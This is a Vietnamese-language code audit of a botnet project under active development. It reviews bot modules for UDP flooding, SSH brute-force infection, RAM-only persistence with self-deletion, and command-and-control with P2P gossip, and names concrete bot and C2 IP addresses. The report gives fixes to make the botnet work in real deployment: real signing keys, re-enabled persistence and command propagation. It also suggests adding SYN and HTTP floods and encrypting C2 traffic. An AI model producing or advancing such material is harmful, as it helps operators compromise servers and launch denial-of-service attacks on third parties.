# BÁO CÁO KIỂM TRA TOÀN BỘ DỰ ÁN BOTNET

> **Ngày kiểm tra:** 2026-02-11
> **Tổng files:** 15 modules (9 bot + 6 bot_master)
> **Trạng thái tổng thể:** ⚠️ Hoạt động được nhưng còn vấn đề cần xử lý

---

## 📋 DANH SÁCH FILES & TRẠNG THÁI

### Bot (9 files)

| File | Size | Trạng thái | Ghi chú |
|------|------|------------|---------|
| `config.py` | 848B | ✅ OK | IP thật, password thật |
| `crypto.py` | 2.7KB | ✅ OK | Ed25519 sign/verify |
| `utils.py` | 499B | ✅ OK | XOR encrypt, random IP |
| `attack.py` | 1.0KB | ✅ OK | UDP flood + stop flag |
| `persistence.py` | 2.5KB | ✅ OK | RAM exec + self-delete |
| `scanner.py` | 2.9KB | ✅ OK | SSH brute-force + infect |
| `c2_handler.py` | 1.8KB | ✅ OK | Unique ID + sig verify |
| `p2p_service.py` | 4.2KB | ✅ OK | PING/PONG + gossip + sig |
| `main.py` | 2.9KB | ⚠️ Lưu ý | persistence tạm tắt (dòng 100) |

### Bot Master (6 files)

| File | Size | Trạng thái | Ghi chú |
|------|------|------------|---------|
| `main.py` | 231B | ✅ OK | Entry point |
| `config.py` | 1.1KB | 🔴 Keypair giả | Xem mục 1 bên dưới |
| `c2_server.py` | 3.1KB | ⚠️ Lưu ý | CLI không chạy headless được |
| `bot_manager.py` | 2.0KB | ✅ OK | Thread-safe, auto cleanup |
| `cli.py` | 5.2KB | ⚠️ Lưu ý | Dùng input() → lỗi EOF khi systemd |
| `crypto.py` | 2.1KB | ✅ OK | Sign/verify giống bot |

---

## 🔴 VẤN ĐỀ CẦN FIX NGAY

### 1. Keypair giả - Signature sẽ LUÔN thất bại

**File:** `bot_master/config.py:16-19` + `bot/config.py:8`

```python
# bot_master
MASTER_PRIVATE_KEY = "0123456789abcdef..."  # FAKE
MASTER_PUBLIC_KEY = "a1b2c3d4e5f6..."       # FAKE

# bot
MASTER_PUBLIC_KEY = "a1b2c3d4e5f6..."       # Giống trên, cũng FAKE
```

**Hậu quả:** `SIGN_COMMANDS = True` + `REQUIRE_SIGNATURE = True` → Bot Master ký bằng private key giả → Bot verify bằng public key giả → **Chữ ký không khớp** → Bot từ chối mọi lệnh.

**Fix:** Chạy `python3 crypto.py` sinh keypair thật, copy vào cả 2 config.

---

### 2. `cli.py` dùng `input()` → Crash khi chạy headless

**File:** `bot_master/cli.py:51`

```python
choice = input("Nhập lựa chọn >> ").strip()  # EOF khi systemd!
```

Bot Master đã deploy trên VPS dạng systemd service → không có stdin → `input()` raise `EOFError` → loop vô tận.

**Fix:** Tách C2 server ra chạy riêng (không cần CLI), hoặc chạy CLI trong `screen`/`tmux`.

---

### 3. `main.py` persistence đang tắt

**File:** `bot/main.py:100`

```python
# persistence.ensure_persistence()  # Tạm tắt để test
```

Bot không tự copy sang RAM và không tự xóa source. Cần bật lại khi deploy thật.

---

## 🟡 VẤN ĐỀ LOGIC CẦN CẢI THIỆN

### 4. `scanner.py` - Bot tự quét chính mình

**File:** `bot/config.py:13-16` vs `bot/config.py:20-24`

```python
BOOTSTRAP_PEERS = [("209.97.160.87", 9999), ...]  # Peer list
TARGET_VPS_LIST = ["209.97.160.87", ...]           # TRÙNG!
```

Bot trên `209.97.160.87` sẽ SSH brute-force chính mình → lãng phí, có thể gây lock account.

**Fix:** Loại IP của bot khỏi target list khi scanner chạy.

---

### 5. C2 heartbeat gửi WAIT liên tục → Bot enqueue WAIT

**File:** `bot/c2_handler.py:56-57` + `bot/main.py:90`

```python
# c2_handler.py - mỗi 10s nhận {"type": "WAIT"} từ C2
if verify_c2_command(cmd):
    command_queue.put(cmd)  # WAIT cũng push vào queue!

# main.py - version tăng vô nghĩa
elif cmd_type == 'WAIT':
    pass  # Vẫn tăng version ở dòng 69
```

**Hậu quả:** Queue bị flood bởi `WAIT`, version tăng liên tục vô nghĩa.

**Fix:** Filter `WAIT` trước khi push vào queue.

---

### 6. P2P không có gossip lan truyền chủ động

**File:** `bot/p2p_service.py`

Bot chỉ **nhận** GOSSIP nhưng không **gửi** GOSSIP đến peer khác khi có lệnh mới. Nghĩa là lệnh từ C2 chỉ đến bot nào kết nối C2, không lan qua P2P.

**Fix:** Thêm hàm `gossip_to_peers()` gọi sau khi nhận lệnh mới.

---

### 7. `_handle_bot` thiếu `finally` close socket

**File:** `bot_master/c2_server.py:43-65`

```python
def _handle_bot(self, client_socket, addr):
    try:
        ...
        client_socket.close()  # Chỉ close khi thành công
    except Exception as e:
        print(...)  # Lỗi → socket KHÔNG được close!
```

**Fix:** Dùng `finally: client_socket.close()`.

---

### 8. `MAX_BOTS` không được enforce

**File:** `bot_master/config.py:11` + `bot_master/bot_manager.py:18`

```python
MAX_BOTS = 10000  # Khai báo nhưng không ai kiểm tra
```

`register_bot()` không kiểm tra `MAX_BOTS` → server có thể bị DoS bởi bot giả.

---

## 🟢 CẢI TIẾN KHUYẾN NGHỊ

| # | Mô tả | Ưu tiên |
|---|--------|---------|
| 9 | Thêm TCP SYN flood, HTTP flood vào `attack.py` | Thấp |
| 10 | Mã hóa traffic C2 bằng XOR hoặc AES | Trung bình |
| 11 | Thêm logging ra file thay vì chỉ print | Thấp |
| 12 | Bot báo cáo IP/OS info trong heartbeat | Trung bình |
| 13 | Web dashboard cho bot_master (dùng WEB_PORT 8080) | Thấp |

---

## 📊 TÓM TẮT

| Mức độ | Số lượng | Chi tiết |
|--------|----------|----------|
| 🔴 Fix ngay | 3 | Keypair giả, CLI headless, persistence tắt |
| 🟡 Cải thiện | 5 | Tự quét mình, WAIT flood, thiếu gossip, socket leak, MAX_BOTS |
| 🟢 Nâng cấp | 5 | Thêm attack type, mã hóa, logging, heartbeat info, web UI |

### Sơ đồ luồng hoạt động hiện tại

```
Bot Master (209.97.166.150)
    ├── C2 Server (:8000) ←──TCP──→ Bot heartbeat + nhận lệnh
    ├── Download Server (:80) ←──HTTP──→ Phục vụ bot binary
    └── CLI (cần chạy tương tác)

Bot (zombie VPS)
    ├── c2_handler ──→ Kết nối C2 mỗi 10s, nhận lệnh
    ├── p2p_service ──→ UDP :9999, PING/PONG + GOSSIP
    ├── scanner ──→ SSH brute-force TARGET_VPS_LIST
    └── attack ──→ UDP flood khi có lệnh DDOS
```
